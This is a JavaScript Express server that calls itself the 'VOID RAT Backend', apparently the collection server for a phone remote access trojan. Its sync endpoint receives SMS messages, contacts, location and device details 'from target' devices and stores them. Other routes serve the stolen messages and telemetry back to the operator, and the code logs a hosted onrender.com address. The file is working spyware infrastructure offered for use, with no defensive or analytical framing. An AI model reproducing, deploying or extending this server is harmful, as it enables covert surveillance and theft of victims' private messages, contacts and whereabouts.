const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

const DATA_FILE = path.join(__dirname, 'data.json');

// Load existing data
let store = {
    devices: {},
    sms: [],
    contacts: [],
    telemetry: {}
};

if (fs.existsSync(DATA_FILE)) {
    try {
        store = JSON.parse(fs.readFileSync(DATA_FILE));
    } catch (e) {}
}

function saveData() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2));
    } catch (e) {}
}

// ─── ROOT ROUTE ───
app.get('/', (req, res) => {
    res.json({
        status: 'VOID RAT Backend is running',
        endpoints: {
            sync: '/api/sync (POST)',
            sms: '/api/sms (GET)',
            devices: '/api/devices (GET)',
            telemetry: '/api/telemetry (GET)'
        },
        timestamp: new Date().toISOString()
    });
});

// ─── RECEIVE DATA FROM TARGET ───
app.post('/api/sync', (req, res) => {
    const data = req.body;
    const deviceId = data.device_id || 'unknown';

    if (!store.devices[deviceId]) {
        store.devices[deviceId] = { firstSeen: Date.now() };
    }
    store.devices[deviceId].lastSeen = Date.now();
    store.devices[deviceId].device_info = data.device_info || {};
    store.devices[deviceId].location = data.location || {};
    store.devices[deviceId].battery = data.battery || 0;

    if (data.sms && Array.isArray(data.sms)) {
        store.sms = [...data.sms, ...store.sms].slice(0, 10000);
    }

    if (data.contacts && Array.isArray(data.contacts)) {
        store.contacts = data.contacts;
    }

    store.telemetry[deviceId] = {
        ...store.telemetry[deviceId],
        ...data,
        lastUpdate: Date.now()
    };

    saveData();
    console.log(`📥 Data from ${deviceId}: ${data.sms ? data.sms.length : 0} SMS`);

    res.json({ status: 'ok', device: deviceId });
});

// ─── GET SMS ───
app.get('/api/sms', (req, res) => {
    const filter = req.query.filter || 'all';
    let filtered = store.sms;
    if (filter === 'inbox') {
        filtered = store.sms.filter(s => s.type === 'incoming');
    } else if (filter === 'sent') {
        filtered = store.sms.filter(s => s.type === 'outgoing');
    }
    res.json({ sms: filtered.slice(0, 500) });
});

// ─── GET DEVICES ───
app.get('/api/devices', (req, res) => {
    res.json(store.devices);
});

// ─── GET TELEMETRY ───
app.get('/api/telemetry', (req, res) => {
    const deviceId = req.query.device || Object.keys(store.devices)[0];
    res.json(store.telemetry[deviceId] || {});
});

// ─── START SERVER ───
const PORT = process.env.PORT || 8443;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🔥 VOID RAT backend running on port ${PORT}`);
    console.log(`   Root: https://void-backend-r5ak.onrender.com/`);
    console.log(`   API: https://void-backend-r5ak.onrender.com/api/sms`);
});
